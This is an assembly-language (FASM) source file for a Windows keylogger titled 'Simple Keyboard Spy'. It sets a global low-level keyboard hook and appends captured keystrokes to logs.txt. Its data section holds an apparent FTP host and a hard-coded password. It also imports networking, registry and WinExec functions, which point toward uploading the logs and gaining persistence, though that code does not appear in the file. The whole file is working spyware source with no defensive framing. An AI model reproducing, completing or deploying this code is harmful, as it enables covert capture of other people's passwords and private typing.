format PE GUI 4.0
entry start

include 'win32ax.inc'


WH_KEYBOARD_LL = 13;

Buf db 36 dup(?)
Buf2 db 10000 dup(?)

section '.data' data readable writeable
  filename db "logs.txt",0
  filemode db "a",0
  fp	   dd 0
  size	   dd 0
  hSession dd 0
  hConnect dd 0
  sDir	   db "www",0
  password db "ABundaDaAlexiaEh",0
  ID	   db "bonitinho.eu5.org",0
  open	   db "bonitinho.eu5.org",0

  WndCaption db 'Simple Keyboard Spy', 0
  MemoClass db 'Edit', 0
  WndClassStr db "KSWindowClass"
  KBMsg db "Keyboard Message = ", 0
  ScanCode db "Virtual Key = ", 0
  WMKeyDownStr db "WM_KEYDOWN", 13, 10, 0
  WMKeyUpStr db "WM_KEYUP", 13, 10, 0
  WMSysKeyDownStr db "WM_SYSKEYDOWN", 13, 10, 0
  WMSysKeyUpStr db "WM_SYSKEYUP", 13, 10, 0
  CrLf db 13, 10, 0

  counter  dd 0

  sRemote  dd 0
  hFtp	   dd 0
  MemoWnd dd ?
  MemoFont dd ?
  HHook dd ?

  Msg MSG
  WinClass WNDCLASS 0, WindowProc, 0, 0, NULL, NULL, NULL, COLOR_BTNFACE + 1, NULL, WndClassStr
  Client RECT

section '.code' code readable executable

  ;Code Starts Here...
  start:
	invoke	GetModuleHandle, 0
	mov	[WinClass.hInstance], eax
	invoke	LoadIcon, eax, 17
	mov	[WinClass.hIcon], eax
	invoke	LoadCursor, 0, IDC_ARROW
	mov	[WinClass.hCursor], eax
	invoke	RegisterClass, WinClass

	invoke	CreateWindowEx, 0, WndClassStr, WndCaption,WS_OVERLAPPEDWINDOW, \
		  150, 140, 300, 300, NULL, 0, [WinClass.hInstance], NULL

  Msg_Loop:
	invoke	GetMessage, Msg, NULL, 0, 0
	or	eax, eax
	jz	End_Loop

	invoke	TranslateMessage, Msg
	invoke	DispatchMessage, Msg

	jmp	Msg_Loop

  End_Loop:
	invoke	ExitProcess, [Msg.wParam]

proc AddToMemo

       ret
endp

; Low-Level Keyboard Proc
proc KeyBoardProc PCode, WParam, LParam
	cmp	[PCode], HC_ACTION
	jne	DoWork
	invoke	CallNextHookEx, [HHook], [PCode], [WParam], [LParam]

  DoWork:
	; Clear Buffer
	invoke	ZeroMemory, Buf, 36
	; Set The First Part Of Buffer
	invoke	lstrcpy, Buf, KBMsg
	cmp	[WParam], WM_KEYDOWN
	je	QuitLabel
	cmp	[WParam], WM_KEYUP
	je	DONE
	cmp	[WParam], WM_SYSKEYDOWN
	je	DONE
	cmp	[WParam], WM_SYSKEYUP
	je	QuitLabel

	jmp	QuitLabel

  ; Dislay Text
  QuitLabel:
	 cinvoke   fopen,filename,filemode
	 mov	  [fp],eax
;	 call	 AddToMemo
	; Add Scancode
	lea ebx,[LParam];GET THE KEYSTROKE AT LPARAM
	mov ebx,[ebx]
       cinvoke	 fwrite,ebx,1,1,[fp]
       cinvoke	 fclose,[fp]

DONE:
ret
endp

; Window Procedure
proc WindowProc HWnd, Msg, WParam, LParam

	push	ebx esi edi
	cmp	[Msg], WM_CREATE
	je	WM_Create
	cmp	[Msg], WM_SIZE
	je	WM_Size
	cmp	[Msg], WM_SETFOCUS
	je	WM_SetFocus
	cmp	[Msg], WM_DESTROY
	je	WM_Destroy

  DefWndProc:
	invoke	DefWindowProc, [HWnd], [Msg], [WParam], [LParam]
	jmp	Finish

  WM_Create:
	invoke	GetClientRect, [HWnd], Client
	invoke	CreateWindowEx, WS_EX_CLIENTEDGE, MemoClass, 0, WS_VISIBLE + WS_CHILD + WS_HSCROLL + WS_VSCROLL + ES_AUTOHSCROLL + \
		  ES_AUTOVSCROLL + ES_READONLY +  ES_MULTILINE, [Client.left], [Client.top], [Client.right], \
		  [Client.bottom], [HWnd], 0, [WinClass.hInstance], NULL
	or	eax, eax
	jz	Failed
	mov	[MemoWnd], eax
	invoke	GetStockObject, DEFAULT_GUI_FONT
	mov	[MemoFont], eax
	invoke	SendMessage, [MemoWnd], WM_SETFONT, eax, FALSE
	; Set Hook
	invoke	SetWindowsHookEx, WH_KEYBOARD_LL, KeyBoardProc, [WinClass.hInstance], 0
	or eax, eax
	jz Failed
	mov	[HHook], eax
	xor	eax, eax
	jmp	Finish
      Failed:
	or	eax, -1
	jmp	Finish
  WM_Size:
	invoke	GetClientRect, [HWnd], Client
	invoke	MoveWindow, [MemoWnd], [Client.left], [Client.top], [Client.right], [Client.bottom], TRUE
	xor	eax, eax
	jmp	Finish
  WM_SetFocus:
	invoke	SetFocus, [MemoWnd]
	xor	eax, eax
	jmp	Finish
  WM_Destroy:
	; Remove Hook
	invoke	UnhookWindowsHookEx, [HHook]
	invoke	PostQuitMessage, 0
	xor	eax, eax

  Finish:
	pop	edi esi ebx
	ret
endp

section '.idata' import data readable writeable

  library kernel,'KERNEL32.DLL',\
	  user,'USER32.DLL',\
	  gdi,'GDI32.DLL',\
	  advapi32,'ADVAPI32.DLL',\
	  wininet,'wininet.dll',\
	  msvcrt,'MSVCRT.DLL'


  import kernel,\
	 GetModuleHandle,'GetModuleHandleA',\
	 ExitProcess,'ExitProcess',\
	 lstrcat,'lstrcat',\
	 lstrcpy,'lstrcpy',\
	 lstrlen, 'lstrlen',\
	 ZeroMemory,'RtlZeroMemory',\
	 WinExec,'WinExec'

  import user,\
	 UnhookWindowsHookEx, 'UnhookWindowsHookEx',\
	 SetWindowsHookEx, 'SetWindowsHookExA',\
	 CallNextHookEx,'CallNextHookEx',\
	 RegisterClass,'RegisterClassA',\
	 CreateWindowEx,'CreateWindowExA',\
	 DefWindowProc,'DefWindowProcA',\
	 GetMessage,'GetMessageA',\
	 TranslateMessage,'TranslateMessage',\
	 DispatchMessage,'DispatchMessageA',\
	 SendMessage,'SendMessageA',\
	 LoadCursor,'LoadCursorA',\
	 LoadIcon,'LoadIconA',\
	 GetClientRect,'GetClientRect',\
	 MoveWindow,'MoveWindow',\
	 SetFocus,'SetFocus',\
	 GetWindowTextLength, 'GetWindowTextLengthA',\
	 GetWindowText,'GetWindowTextA',\
	 SetWindowText,'SetWindowTextA',\
	 MessageBox,'MessageBoxA',\
	 PostQuitMessage,'PostQuitMessage'

  import advapi32,\
	 RegCreateKeyExA,'RegCreateKeyExA',\
	 RegSetValueExA,'RegSetValueExA',\
	 RegCloseKey,'RegCloseKey'

  import gdi,\
	 GetStockObject, 'GetStockObject'

	   import msvcrt,\
	 fopen,'fopen',\
	 fwrite,'fwrite',\
	 fclose,'fclose'



